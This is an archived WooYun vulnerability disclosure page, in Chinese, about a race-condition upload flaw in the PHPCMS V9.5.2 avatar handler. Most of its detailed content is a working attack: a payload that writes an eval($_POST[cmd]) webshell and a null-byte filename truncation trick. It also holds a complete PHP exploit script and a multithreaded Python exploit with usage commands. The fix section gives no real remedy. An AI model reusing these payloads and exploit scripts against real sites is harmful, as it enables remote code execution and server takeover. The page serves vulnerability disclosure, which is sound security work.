@@ -1,0 +1,573 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		PHPCMS前台设计缺陷导致任意代码执行  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		PHPCMS前台设计缺陷导致任意代码执行  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/felixk3y">felixk3y</a> 
+</li><li>提交时间：		2014-01-25 11:49</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-25：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-26：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-29：	细节向第三方安全合作伙伴开放<br/>
+									2014-02-05：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-15：	细节向普通白帽子公开<br/>
+									2014-03-07：	细节向实习白帽子公开<br/>
+									2014-04-25：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">PHPCMS前台存在严重设计缺陷<br />
+利用这个设计缺陷可导致任意代码/命令执行,当然可Getshell.<br />
+<br />
+但PHPCMS代码执行不是这篇文章的主题,今天的主题是：<br />
+主题一：给大家介绍一种通用的设计缺陷,希望能引起各个厂商重视,以及由此衍生出来的一种比较新颖的漏洞利用方法,此设计缺陷目前我已在多个CMS上证明.<br />
+主题二：我想说的是当我们有任何奇思妙想的时候，哪怕这个想法&quot;不切实际&quot;、&quot;不可能&quot;，只要我们想方设法去实践,就会有意想不到的效果,这个漏洞就是证明.<br />
+<br />
+PS: 明天放假了,在这里祝大家新年快乐!</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">#1 前言<br />
+<br />
+猛兽来了,我们应该将其绝杀在门外,但是有些人非得把它放进屋内,才杀之,你们难道不知道猛兽的嘴里可能叼了一个炸药包吗? 砰!!!结果全都完完了…<br />
+<br />
+#2 叼着炸药包的猛兽来了<br />
+<br />
+请先看下面这段代码<br />
+<br />
+</p><pre><code>&lt;?php<br />
+ if(isset($_GET[&#039;src&#039;])){<br />
+ 	copy($_GET[&#039;src&#039;],$_GET[&#039;dst&#039;]);<br />
+ 	//...<br />
+ 	unlink($_GET[&#039;dst&#039;]);<br />
+ 	//...<br />
+ }<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+这段代码实际意义不大,不过,没关系我们重在研究嘛,一种典型的”将猛兽放进室内,才杀之”的案例，我们来看看<br />
+<br />
+</p><pre><code>猛兽放进室内：copy($_GET[&#039;src&#039;],$_GET[&#039;dst&#039;]);</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>这条猛兽不安全,杀之：unlink($_GET[&#039;dst&#039;]);</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>炸药包：$_GET[&#039;dst&#039;]--&gt;此炸药包非彼炸药包,此炸药包的作用是生成恶意文件 :-)</code></pre><p class='detail'><br />
+<br />
+上述代码即存在本文所讲的设计缺陷<br />
+<br />
+</p><pre><code>copy($_GET[&#039;src&#039;],$_GET[&#039;dst&#039;]);</code></pre><p class='detail'><br />
+<br />
+可将任意文件copy成恶意文件,如木马，后来发现这个文件不安全，后面的unlink($_GET[&#039;dst&#039;]);将之删除...<br />
+<br />
+但是，各位厂商们 你们可曾想到这个木马可能在你们删除之前,生成了新的木马文件,结果可想而知,SO... 还请在设计产品时多考虑考虑....<br />
+<br />
+#3 PHPCMS案例<br />
+<br />
+PHPCMS相应的设计缺陷在上传头像的功能处，我们来看看其代码<br />
+<br />
+/phpsso_server/phpcms/modules/phpsso/index.php 第572行开始 uploadavatar()函数<br />
+<br />
+</p><pre><code>public function uploadavatar() {<br />
+		<br />
+		//根据用户id创建文件夹<br />
+		if(isset($this-&gt;data[&#039;uid&#039;]) &amp;&amp; isset($this-&gt;data[&#039;avatardata&#039;])) {<br />
+			$this-&gt;uid = $this-&gt;data[&#039;uid&#039;];<br />
+			$this-&gt;avatardata = $this-&gt;data[&#039;avatardata&#039;];<br />
+		} else {<br />
+			exit(&#039;0&#039;);<br />
+		}<br />
+		<br />
+		$dir1 = ceil($this-&gt;uid / 10000);<br />
+		$dir2 = ceil($this-&gt;uid % 10000 / 1000);<br />
+		<br />
+		//创建图片存储文件夹<br />
+		$avatarfile = pc_base::load_config(&#039;system&#039;, &#039;upload_path&#039;).&#039;avatar/&#039;;<br />
+		$dir = $avatarfile.$dir1.&#039;/&#039;.$dir2.&#039;/&#039;.$this-&gt;uid.&#039;/&#039;;<br />
+		if(!file_exists($dir)) {<br />
+			mkdir($dir, 0777, true);<br />
+		}<br />
+		//存储flashpost图片<br />
+		$filename = $dir.$this-&gt;uid.&#039;.zip&#039;;<br />
+		file_put_contents($filename, $this-&gt;avatardata);<br />
+		<br />
+		pc_base::load_sys_func(&#039;dir&#039;);<br />
+		//解压缩文件<br />
+		pc_base::load_app_class(&#039;pclzip&#039;, &#039;phpsso&#039;, 0);<br />
+		$archive = new PclZip($filename);<br />
+		$archive-&gt;allow_ext = array(&#039;jpg&#039;);<br />
+		$list = $archive-&gt;extract(PCLZIP_OPT_PATH, $dir,PCLZIP_OPT_REMOVE_ALL_PATH);<br />
+		<br />
+		//判断文件安全，删除压缩包和非jpg图片<br />
+		$avatararr = array(&#039;180x180.jpg&#039;, &#039;30x30.jpg&#039;, &#039;45x45.jpg&#039;, &#039;90x90.jpg&#039;);<br />
+		$files = glob($dir.&quot;*&quot;);<br />
+		foreach($files as $_files) {<br />
+			if(is_dir($_files)) dir_delete($_files);<br />
+			if(!in_array(basename($_files), $avatararr)) @unlink($_files);<br />
+		}<br />
+		if($handle = opendir($dir)) {<br />
+		    while(false !== ($file = readdir($handle))) {<br />
+				if($file !== &#039;.&#039; &amp;&amp; $file !== &#039;..&#039;) {<br />
+					if(!in_array($file, $avatararr)) {<br />
+						@unlink($dir.$file);<br />
+					} else {<br />
+						$info = @getimagesize($dir.$file);<br />
+						if(!$info || $info[2] !=2) {<br />
+							@unlink($dir.$file);<br />
+						}<br />
+					}<br />
+				}<br />
+		    }<br />
+		    closedir($handle);    <br />
+		}<br />
+		$this-&gt;db-&gt;update(array(&#039;avatar&#039;=&gt;1), array(&#039;uid&#039;=&gt;$this-&gt;uid));<br />
+		exit(&#039;1&#039;);<br />
+	}</code></pre><p class='detail'><br />
+<br />
+大概意思是解压ZIP文件,再删除非jpg文件，目录等(看见了吧,产生了#2所述的设计缺陷,典型的引狼入室,再杀之的设计理念),但由于在此处出现过上传漏洞,增加了这么一行代码：<br />
+<br />
+</p><pre><code>$archive-&gt;allow_ext = array(&#039;jpg&#039;);</code></pre><p class='detail'><br />
+<br />
+只允许jpg格式文件,不允许php后缀的文件,这为我们下面的漏洞利用带来了不少的麻烦,但别急,后面我会讲到突破的方法...<br />
+<br />
+#4 突破限制产生php临时文件<br />
+<br />
+虽然代码限制了只能是jpg格式的文件,但我们的文件名可以是1.php.php.jpg 对吧,<br />
+<br />
+想到什么没有呢?对！采用文件名截断...行动吧<br />
+<br />
+（为了方便调试，我们加入如下代码,即在解压zip文件后，删除非jpg文件前中断代码的执行）<br />
+<br />
+</p><pre><code>$archive = new PclZip($filename);<br />
+exit(&#039;zanting....&#039;);//我们添加的调试代码<br />
+$archive-&gt;allow_ext = array(&#039;jpg&#039;);<br />
+$list = $archive-&gt;extract(PCLZIP_OPT_PATH, $dir,PCLZIP_OPT_REMOVE_ALL_PATH);</code></pre><p class='detail'><br />
+<br />
+结果，成功在目录下生成了1.php文件<br />
+<br />
+</p><p class="detail"><a href="../images/2510173723da233e92356019e9b5f05471d520cb.jpg" target="_blank"><img src="../images/2510173723da233e92356019e9b5f05471d520cb.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/25101752c83adb7145293673641bcad6fb7db651.jpg" target="_blank"><img src="../images/25101752c83adb7145293673641bcad6fb7db651.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+#5 漏洞利用poc<br />
+<br />
+只要有php文件生成那就好办了，poc构想如下：<br />
+<br />
+正常情况：<br />
+<br />
+上传头像--&gt;生成临时文件(1.php)--&gt;删除非jpg文件<br />
+<br />
+我们想要的情况：<br />
+<br />
+上传头像--&gt;生成临时文件(1.php)--&gt;1.php在上层目录生成shell.php文件--&gt;删除1.php等非jpg文件，留下shell.php文件--&gt;成功<br />
+<br />
+1.php.php.jpg文件的内容为：<br />
+<br />
+</p><pre><code>&lt;?php fputs(fopen(&#039;../../../../shell.php&#039;,&#039;w&#039;),&#039;&lt;?php @eval($_POST[cmd])?&gt;&#039;);?&gt;</code></pre><p class='detail'><br />
+<br />
+同时用数字填充，大小为1 2M左右，同时打包为ZIP包，如图：<br />
+<br />
+</p><p class="detail"><a href="../images/251025324920df710b7a81b30360b57a09f5bc43.jpg" target="_blank"><img src="../images/251025324920df710b7a81b30360b57a09f5bc43.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+当然为了能顺利的利用，手工是不行的,程序的执行多快啊 是吧...<br />
+<br />
+于是我们利用PHP写出POC，打开至少15个CMD窗口跑起来,模仿多线程嘛,哈哈...<br />
+<br />
+我相信不一会就会在上层目录生成我们想要的shell.php文件，POC如下 这里就不演示了...<br />
+<br />
+</p><pre><code>&lt;?php<br />
+/**<br />
+ * Created by felixk3y<br />
+ * Date: 14-01-10<br />
+ * Name: PHPCMS V9.5.2 Arbitrary File Upload Exploit...<br />
+ * Blog: http://weibo.com/rootsafe<br />
+ */<br />
+ error_reporting(7);<br />
+ if($argc&lt;2){<br />
+ 	print &quot;\n\tUsage:exp.php www.vulns.org\n&quot;;<br />
+ 	exit();<br />
+ }<br />
+ $num = 0;<br />
+ $loop = 0;<br />
+ $host = $argv[1];<br />
+ $posts = post();<br />
+ $shell = &quot;/phpcms/phpsso_server/uploadfile/shell.php&quot;;//生成shell的地址<br />
+ $tmpfile = &quot;/phpcms/phpsso_server/uploadfile/avatar/1/1/1/1.php&quot;;//临时的php文件,后面会被删除<br />
+ //先访问临时数据包<br />
+ while(++$loop&lt;6){<br />
+	 echo &quot;正在进行第&quot;.$loop.&quot;轮尝试...\n&quot;;<br />
+	 while(++$num&lt;11){<br />
+		 echo &quot;正在进行第&quot;.$num.&quot;次尝试访问临时文件...\n&quot;;<br />
+		_get($host,$tmpfile);<br />
+	 }<br />
+	 $num = 0;<br />
+	 while(++$num&lt;51){<br />
+		echo &quot;正在进行第&quot;.$num.&quot;次提交ZIP数据包同时试访问临时文件...\n&quot;;<br />
+		send_http($host,$posts);//正常提交数据包<br />
+		//if($num%2==0){<br />
+			_get($host,$tmpfile);<br />
+		//}<br />
+	 }<br />
+	 $num = 0;<br />
+	 while(++$num&lt;11){<br />
+		 echo &quot;正在进行第&quot;.$num.&quot;次尝试访问临时文件...\n&quot;;<br />
+		_get($host,$tmpfile);<br />
+	 }<br />
+	 $num = 0;<br />
+ }<br />
+ $res = _get($host,$shell);<br />
+ if(preg_match(&#039;/200 OK/&#039;,$res)) {<br />
+	echo &quot;---&gt;Success!\n\n&quot;;<br />
+ }else{<br />
+	echo &quot;-------&gt;Failed!\n\n&quot;;<br />
+ }<br />
+ function post(){<br />
+	 $asc = hex2asc(&quot;00&quot;);//目的是截断1.php.php.jpg为1.php<br />
+	 $repstr = &quot;php&quot;.$asc.&quot;php&quot;;<br />
+	 $data = &quot;&quot;;<br />
+	 $fp = fopen(&#039;phpcms.zip&#039;,&#039;r&#039;);//phpcms.zip要上传的数据包<br />
+	 while(!feof($fp)){<br />
+		$data .=fgets($fp);<br />
+	 }<br />
+	 $data = preg_replace(&#039;/php\.php/i&#039;,$repstr,$data);<br />
+	 return $data;<br />
+ }<br />
+ function hex2asc($str){//进制间转换<br />
+	$str = join(&#039;&#039;,explode(&#039;\x&#039;,$str));<br />
+	$len = strlen($str);<br />
+	for($i=0;$i&lt;$len;$i+=2) $data.=chr(hexdec(substr($str,$i,2)));<br />
+	return $data;<br />
+}<br />
+ function _get($host,$path){ //http get方法<br />
+	$headers  = &quot;GET $path HTTP/1.1\r\n&quot;;<br />
+	$headers .= &quot;Host: &quot;.$host.&quot;\r\n&quot;;<br />
+	$headers .= &quot;Connection: close\r\n\r\n&quot;;<br />
+    $fp = @fsockopen($host,80);<br />
+    fputs($fp, $headers);<br />
+	$resp = &#039;&#039;;<br />
+	while (!feof($fp)){<br />
+		$resp .= fgets($fp, 2048);<br />
+	}<br />
+    return $resp;<br />
+ }<br />
+ function send_http($host,$post)<br />
+ {<br />
+    $data = &quot;POST /phpcms/phpsso_server/index.php?m=phpsso&amp;c=index&amp;a=uploadavatar&amp;auth_data=v=1&amp;appid=1&amp;data=f58eCAZVBQJSVAkJA1sCWQpRAFBQVVEBDlYEAgQRWQUOVx9IRTpURxYMZlJWGgoJfmZiDUZXKm5PcjcTbgBfNgoAW0hwFAFqFC9bemJacg HTTP/1.1\r\n&quot;;<br />
+    $data .= &quot;Host: www.vulns.org\r\n&quot;;<br />
+    $data .= &quot;User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\r\n&quot;;<br />
+    $data .= &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;;<br />
+    $data .= &quot;Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3\r\n&quot;;<br />
+    $data .= &quot;Accept-Encoding: gzip, deflate\r\n&quot;;<br />
+    $data .= &quot;Connection: keep-alive\r\n&quot;;<br />
+    $data .= &quot;Content-Length: &quot; . strlen($post) . &quot;\r\n\r\n&quot;;<br />
+    $data .= $post . &quot;\r\n&quot;;<br />
+    //echo $data;<br />
+    $fp = @fsockopen($host,80,$errno,$errstr,30);<br />
+    if(!$fp){<br />
+        echo $errno.&#039;--&gt;&#039;.$errstr.&quot;\n&quot;;<br />
+        exit(&#039;Could not connect to: &#039;.$host);<br />
+    }else{<br />
+        fputs($fp, $data);<br />
+        $back = &#039;&#039;;<br />
+        while(!feof($fp)){<br />
+            $back .= fgets($fp, 2048);<br />
+        }<br />
+        fclose($fp);<br />
+    }<br />
+    return $back;<br />
+ }<br />
+ ?&gt;</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">#6 Exp利用代码<br />
+<br />
+为了方便利用，最后我用py写了最终的EXP,代码如下<br />
+<br />
+</p><pre><code>#coding=GB2312<br />
+#Date: 2014-01-11 23:50<br />
+#Created by felixk3y<br />
+#Name: PHPCMS &lt;=V9.5.2 Arbitrary File Upload Exploit...<br />
+#Blog: http://weibo.com/rootsafe<br />
+<br />
+import os<br />
+import sys<br />
+import socket<br />
+import urllib<br />
+import urllib2<br />
+import threading<br />
+import msvcrt<br />
+<br />
+# postu: 文件上传post的URL<br />
+# shell: 最终生成shell的URL<br />
+# tmpfile: 文件上传生成的临时文件URL<br />
+# postu &amp; shell &amp; tmpfile 这三个参数根据具体情况更改<br />
+postu   = &#039;/install_package/phpsso_server/index.php&#039;<br />
+shell   = &#039;/install_package/phpsso_server/uploadfile/shell.php&#039;<br />
+tmpfile = &#039;/install_package/phpsso_server/uploadfile/avatar/1/1/1/1.php&#039;<br />
+<br />
+class upload(threading.Thread):<br />
+    def __init__(self,num,loop,host,header,tmpfile,shell):<br />
+        threading.Thread.__init__(self)<br />
+        self.num     = num<br />
+        self.loop    = loop<br />
+        self.host    = host<br />
+        self.header  = header<br />
+        self.shell   = &#039;%s%s&#039; % (host,shell)<br />
+        self.tmpfile = &#039;%s%s&#039; % (host,tmpfile)<br />
+        <br />
+    def run(self):<br />
+        while True:<br />
+            print &#039;正在进行第%d轮尝试...\n&#039; % self.loop<br />
+            while(self.num&lt;3):<br />
+                print &#039;正在进行第%d次尝试访问临时文件...&#039; % self.num<br />
+                self._get(self.tmpfile)<br />
+                self.num += 1<br />
+            self.num = 1<br />
+            while(self.num&lt;11):<br />
+                print &#039;正在进行第%d次提交ZIP数据包同时试访问临时文件...&#039; % self.num<br />
+                self.send_socket(self.host,self.header)<br />
+                self._get(self.tmpfile)<br />
+                self.num += 1<br />
+            self.num = 1<br />
+            while(self.num&lt;11):<br />
+                print &#039;正在进行第%d次尝试访问临时文件...&#039; % self.num<br />
+                self._get(self.tmpfile)<br />
+                self.num += 1<br />
+            self.loop += 1<br />
+            self.num = 1<br />
+<br />
+    def _get(self,tmpfile):<br />
+        try:<br />
+            response = urllib2.urlopen(tmpfile)<br />
+            if response.getcode() == 200:<br />
+                print &#039;\nSuccess!\nShell: %s\nPass is [1@3].&#039; % self.shell<br />
+                os._exit(1)<br />
+        except urllib2.HTTPError,e:<br />
+            pass<br />
+            <br />
+    def send_socket(self,host,headers):<br />
+        if &#039;http://&#039; in host:<br />
+            host = host.split(&#039;/&#039;)[2]<br />
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />
+        sock.connect((host, 80))<br />
+        sock.send(headers)<br />
+        sock.close()<br />
+        <br />
+<br />
+class ThreadStop(threading.Thread):<br />
+    def run(self):<br />
+        try:           <br />
+            chr = msvcrt.getch()<br />
+            if chr == &#039;q&#039;:<br />
+                print &quot;stopped by your action( q ).&quot;<br />
+                os._exit(1)<br />
+        except:<br />
+            os._exit(1)<br />
+            <br />
+def usage():<br />
+    print &#039;\n\tUsage: upload.py &lt;url&gt;      &#039;<br />
+    print &#039;\n\tExp: upload.py www.vulns.org&#039;<br />
+    os._exit(0)<br />
+<br />
+def hex_to_asc(ch):<br />
+    ch = int(float.fromhex(ch))<br />
+    return &#039;{:c}&#039;.format(ch)<br />
+<br />
+def post_data():<br />
+    postdata = &#039;&#039;<br />
+    asc = hex_to_asc(&#039;00&#039;)<br />
+    repstr = &#039;php%sphp&#039; % asc<br />
+    fps = open(&#039;phpcms.zip&#039;,&#039;rb&#039;)<br />
+    for sbin in fps.readlines():<br />
+        postdata += sbin<br />
+    postdata = postdata.replace(&#039;php.php&#039;,repstr)<br />
+    return postdata<br />
+<br />
+def exploit():<br />
+    num     = 1<br />
+    loop    = 1<br />
+    threads = []<br />
+    host   = sys.argv[1]<br />
+    cookie = sys.argv[2]<br />
+    if &#039;http://&#039; not in host:<br />
+        host = &#039;http://%s&#039; % host<br />
+    <br />
+    postdata = post_data()<br />
+    mhost = host.split(&#039;/&#039;)[2]<br />
+    <br />
+    dvalue  = &#039;3f84AABWUlIDVAFSUwRTVA9QVwRRUAFXAFcLUFNMWgYKAENAQzkDF0cMbgkGTlsAXQdlJQIJCEVqAE5mMUhUJ28FJHV8ABcgXCN5NS5ZNQ&#039;<br />
+    params  = &#039;m=phpsso&amp;c=index&amp;a=uploadavatar&amp;auth_data=v=1&amp;appid=1&amp;data=%s&#039; % dvalue<br />
+    posturl = &#039;%s?%s&#039; % (postu,params)<br />
+    header  = &#039;POST %s HTTP/1.1\r\n&#039; % posturl<br />
+    header += &#039;Host: %s\r\n&#039; % mhost<br />
+    header += &#039;User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\r\n&#039;<br />
+    header += &#039;Content-Type: application/octet-stream\r\n&#039;<br />
+    header += &#039;Accept-Encoding: gzip,deflate,sdch\r\n&#039;<br />
+    header += &#039;Content-Length: %d\r\n&#039; % len(postdata)<br />
+    header += &#039;Cookie: %s\r\n\r\n%s\r\n&#039; % (cookie,postdata)<br />
+    <br />
+    shouhu = ThreadStop()<br />
+    shouhu.setDaemon(True)<br />
+    shouhu.start()<br />
+    <br />
+    for i in range(10):#线程数不能小了<br />
+        t = upload(num,loop,host,header,tmpfile,shell)<br />
+        t.start()<br />
+        threads.append(t)<br />
+    for th in threads:<br />
+        t.join()<br />
+<br />
+if __name__ == &quot;__main__&quot;:<br />
+    if len(sys.argv) &lt; 2:<br />
+        usage()<br />
+    else:<br />
+        exploit()</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+#7 Exp跑起来<br />
+<br />
+</p><pre><code>phpcms_exp.py www.vulns.org cookie值</code></pre><p class='detail'><br />
+<br />
+效果如下所示<br />
+<br />
+</p><p class="detail"><a href="../images/2510361729d3a676f2b48140438ebc9a5d8e055a.jpg" target="_blank"><img src="../images/2510361729d3a676f2b48140438ebc9a5d8e055a.jpg" alt="sss.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/25103814b11aca6dd8dfdab87089065a64c62da3.jpg" target="_blank"><img src="../images/25103814b11aca6dd8dfdab87089065a64c62da3.jpg" alt="s.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你们懂. </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/felixk3y" title="felixk3y">felixk3y</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-049794" title="PHPCMS前台设计缺陷导致任意代码执行">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2014-01-26 13:47</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">最新版已经修复过该漏洞！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="49794";
+var bugRating="-3";
+var myRating="";
+var ratingCount="2";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
